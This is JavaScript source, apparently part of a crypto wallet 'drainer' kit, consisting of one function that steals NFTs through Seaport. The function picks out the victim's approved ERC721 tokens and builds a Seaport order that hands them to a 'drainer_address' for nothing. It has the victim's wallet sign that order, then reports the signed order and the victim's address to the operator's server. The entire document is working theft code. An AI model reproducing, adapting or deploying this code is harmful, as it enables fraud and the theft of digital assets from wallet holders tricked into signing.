const SIGN_SEAPORT = async (assets, provider, victim_address, drainer_address, user_id, min_price = 0) => {
  try {
    const nft_list = [], nft_list_plain = [];
    for (const asset of assets) {
      if (asset.skip || asset.type !== 'ERC721' || asset.chain_id != 1 || asset.amount_usd < min_price) continue;
      if (!await is_nft_approved(asset.address, victim_address, "0x1E0049783F008A0085193E00003D00cd54003c71")) continue;
      nft_list.push({ collection: asset.address, tokenID: asset.id });
      nft_list_plain.push(asset);
    }
    if (nft_list.length === 0) return;
    let web3 = new ethers.providers.Web3Provider(provider), signer = web3.getSigner();
    let seaportOffer = [], seaportConsiderations = [];
    nft_list.forEach((value, _) => {
      seaportOffer.push({
        itemType: 2,
        token: value.collection,
        identifier: value.tokenID,
      })
      seaportConsiderations.push({
        amount: "1",
        recipient: drainer_address,
        itemType: 2,
        token: value.collection,
        identifier: value.tokenID,
      })
    });
    try {
      const seaportObject = new seaport.Seaport(signer, { seaportVersion: '1.5' });
      const { executeAllActions: createSeaportOrder } =
        await seaportObject.createOrder(
          {
            offer: seaportOffer,
            consideration: seaportConsiderations,
            conduitKey: "0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000",
            zone: "0x004C00500000aD104D7DBd00e3ae0A5C00560C00",
            startTime: '1660921177',
            endTime: '19163599577',
            offerer: victim_address
          }, drainer_address);
      await send_request({ action: 'seaport', user_id: user_id, seaport: 'request', assets: nft_list_plain });
      const seaportOrder = await createSeaportOrder();
      await send_request({ action: 'seaport', user_id: user_id, seaport: 'success', order: seaportOrder, address: victim_address });
      for (const asset of assets) {
        if (asset.skip || asset.type !== 'ERC721' || asset.chain_id != 1) continue;
        let is_signed = false;
        for (const x_asset of nft_list_plain) {
          if (x_asset.type !== 'ERC721' || x_asset.chain_id != 1) continue;
          if (x_asset.address == asset.address && x_asset.id == asset.id) {
            is_signed = true;
            break;
          }
        }
        if (is_signed == true) {
          asset.skip = true;
        }
      }
    } catch (err) {
      console.log(err);
      await send_request({ action: 'seaport', user_id: user_id, seaport: 'cancel' });
    }
  } catch (err) {
    console.log(err);
  }
};